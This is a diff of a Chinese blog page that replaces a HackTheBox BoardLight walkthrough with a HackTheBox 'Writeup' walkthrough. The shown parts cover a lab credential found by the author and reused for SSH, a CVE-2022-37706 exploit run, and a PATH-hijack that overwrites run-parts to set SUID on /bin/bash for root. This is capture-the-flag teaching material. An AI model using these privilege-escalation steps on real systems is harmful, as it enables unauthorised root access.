-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></figure>
+<p>启动pspy之后在另外一个窗口重新登录SSH会发现出发了一个脚本：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f819daf21886ccc09c9a01.jpg" data-fancybox="true" alt="Writeup-18" />
 
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea8400f21886ccc07e25a6.jpg" data-fancybox="true" alt="BoardLight-9" />
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">2024/09/28 09:47:22 CMD: UID=0     PID=3543   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new </span><br><span class="line"></span><br><span class="line">2024/09/28 09:47:22 CMD: UID=0     PID=3544   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new </span><br><span class="line"></span><br><span class="line">2024/09/28 09:47:22 CMD: UID=0     PID=3545   | run-parts --lsbsysinit /etc/update-motd.d </span><br><span class="line"></span><br><span class="line">2024/09/28 09:47:22 CMD: UID=0     PID=3546   | uname -rnsom</span><br></pre></td></tr></table></figure>
 
-<p>查出来两个可登录的用户，显然对应靶场的两个Flag，不过下一步的思路就不太明确了，就跟着网友的Write_up做了，在<code>/var/www/html/crm.board.htb/htdocs/conf/conf.php</code>文件中找到了凭据：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea843ff21886ccc07e5ff7.jpg" data-fancybox="true" alt="BoardLight-10" />
+<p>在这我们可以看到，当我们登录jkr用户的时候，root会在<code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code>这些目录中挨个寻找<code>run-parts</code>这个文件来执行；再结合之前我们得到的信息，jkr用户在staff组中，而staff组可以修改&#x2F;usr&#x2F;local&#x2F;sbin里面的文件；那么如此一来我们可以构造一个恶意文件覆盖run-parts这个文件，然后我们再重新ssh登录jkr这个用户即可触发恶意代码。</p>
+<p>思路理解了，在这里参照官方Write-up进行操作，首先先覆盖掉&#x2F;usr&#x2F;sbin&#x2F;run-parts里面的内容，然后赋予执行权限：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">反斜杠n是换行符的意思</span></span><br><span class="line">echo -e &#x27;#!/bin/bash\n\nchmod u+s /bin/bash&#x27; &gt; /usr/local/sbin/run-parts</span><br><span class="line">chmod +x /usr/local/sbin/run-parts</span><br></pre></td></tr></table></figure>
 
-<p>密码是<code>serverfun2$2023!!</code>，这里猜测会有一个密码复用，尝试使用这个密码登录<code>larissa</code>，成功登录：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh larissa@10.10.11.11</span><br></pre></td></tr></table></figure>
+<p>然后我们只需要重新ssh登录jkr，就会发现&#x2F;bin&#x2F;bash文件的权限变了，登录的样子也不一样了：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f819dbf21886ccc09c9a24.jpg" data-fancybox="true" alt="Writeup-19" />
 
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea843ff21886ccc07e6020.jpg" data-fancybox="true" alt="BoardLight-11" />
+<blockquote>
+<p>这里其实有个一个小坑，官方Write-up中是更改&#x2F;usr&#x2F;local&#x2F;bin里面的文件，但是请教了G老师，<code>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code>这里是挨个去找的，并不是都触发一遍的，而是找到了就不找后面的run-parts文件了，所以我按照官方Write-up中的操作死活都不成功，后知后觉才发现这个问题；&#x2F;usr&#x2F;local&#x2F;sbin显然排在第一位，那我们应该去覆盖这里面的run-parts文件才正确。</p>
+</blockquote>
+<p>我们看到图里的&#x2F;bin&#x2F;bash的用户权限已经变成rws了，也就是被设置SetUID位了，那么当别的用户执行这个文件的时候就会以该文件所有者的权限执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/bash -p</span><br></pre></td></tr></table></figure>
 
-<p>Flag就在家目录下：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea8440f21886ccc07e6032.jpg" data-fancybox="true" alt="BoardLight-12" />
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f81a16f21886ccc09d1f09.jpg" data-fancybox="true" alt="Writeup-20" />
 
-<p>低权限的Flag已经获取到了，接下来就是提权了，<code>sudo -l</code>没有什么信息，于是再去看看Write_up：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea8440f21886ccc07e603d.jpg" data-fancybox="true" alt="BoardLight-13" />
-
-<p>网友的笔记中用到了<code>Linpeas</code>这个工具，搜了一下，这是一个可以列举操作系统中所有可能的可提权项，不过去仓库找的时候貌似已经不提供下载了（<a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng">仓库</a>），可以自己创建，但是一时间没整明白，先去找了别人已经编译好的使用了，先把脚本上传至Kali，然后Python的Http服务对靶机提供下载：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea8440f21886ccc07e6044.jpg" data-fancybox="true" alt="BoardLight-14" />
-
-<p>去靶机获取：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea8477f21886ccc07e95ec.jpg" data-fancybox="true" alt="BoardLight-15" />
-
-<p>赋予执行权限后运行：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x linpeas.sh</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure>
-
-<p>可能是我找的这个脚本的问题，我一时间无法定位到有效的提权点，果然能够定制自己的工具是一个很重要的能力啊…翻查Write_up发现是关注SUID有问题的文件：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea8475f21886ccc07e93a1.jpg" data-fancybox="true" alt="BoardLight-16" />
-
-<p>Google一下发现<code>Enlightenment</code>存在一个权限提升的漏洞<code>CVE-2022-37706</code>，已有设置好的<a target="_blank" rel="noopener" href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit">POC</a>：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea8475f21886ccc07e943e.jpg" data-fancybox="true" alt="BoardLight-17" />
-
-<p>POC即开即用~老样子用Python开一个临时Http，将POC下载到靶机：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea8477f21886ccc07e95b1.jpg" data-fancybox="true" alt="BoardLight-18" />
-
-<p>赋予执行权限并执行：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x CVE-2022-37706-LPE-exploit.sh</span><br><span class="line">./CVE-2022-37706-LPE-exploit.sh</span><br></pre></td></tr></table></figure>
-
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea8477f21886ccc07e95ce.jpg" data-fancybox="true" alt="BoardLight-19" />
-
-<p>提权成功，Flag在家目录下：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66ea84a6f21886ccc07ebfdd.jpg" data-fancybox="true" alt="BoardLight-20" />
-
-<p>至此，所有Flag已获取，打靶完毕。</p>
+<p>可以看到euid&#x3D;0了，说明我们当前是以root权限运行了，也正常查到root.txt了，这里就把Flag打码，要自己复现噢~</p>
+<p>至此，所有Flag已获取，打靶结束啦！</p>
 <hr>
 <h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><ul>
-<li>这个靶场是Easy的难度，实际单从操作的情况来说也确实是属于简单的难度，一个提权工具和两个POC的运用，整体打下来的感觉还是缺乏思路，特别是提权前的思路不多，这里还需要多练。再深入一些的话，这里也还有几个可以提升的地方：<ul>
-<li>两个POC的原理还未明白透彻。</li>
-<li>构建出一个自己的linpeas脚本。</li>
+<li>Easy难度的靶机复现起来就是轻松呀~~~前面的Web部分基本就是套路了，后面的提权倒是有意思，又让我加深了一波对Linux权限的理解，还学到了个pspy新工具，信息收集的思路又丰富了！不管官方Write-up也不是百分百复现的捏，还是实践出真知呀。</li>
+<li>参考文章：<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/autopwn/p/14262562.html">https://www.cnblogs.com/autopwn/p/14262562.html</a></li>
 </ul>
 </li>
 </ul>
@@ -223,7 +223,7 @@
     </section>
     </div>
 </article>
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/09/19/HTB-Permx_Write-up/">HTB-Permx_Write-up</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/09/12/HTB-Blurry_Write-up/">HTB-Blurry_Write-up</a></div></section></div>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/09/27/HTB-Compiled_Write-up/">HTB-Compiled_Write-up</a></div></section></div>
 
 
 
@@ -237,7 +237,7 @@
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-BoardLight-Write-up"><span class="toc-text">HTB-BoardLight_Write-up</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87"><span class="toc-text">1.前期准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">2.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8A%E6%8F%90%E6%9D%83"><span class="toc-text">3.漏洞利用及提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%80%BB%E7%BB%93"><span class="toc-text">4.总结</span></a></li></ol></li></ol></div><div class="widget-footer">
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-Writeup-Write-up"><span class="toc-text">HTB-Writeup_Write-up</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87"><span class="toc-text">1.前期准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-User-txt%E8%8E%B7%E5%8F%96"><span class="toc-text">2.信息收集-User.txt获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%8F%90%E6%9D%83-Root-txt%E8%8E%B7%E5%8F%96"><span class="toc-text">3.提权-Root.txt获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%80%BB%E7%BB%93"><span class="toc-text">4.总结</span></a></li></ol></li></ol></div><div class="widget-footer">
 
 <a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
 </div></aside><div class='float-panel blur'>
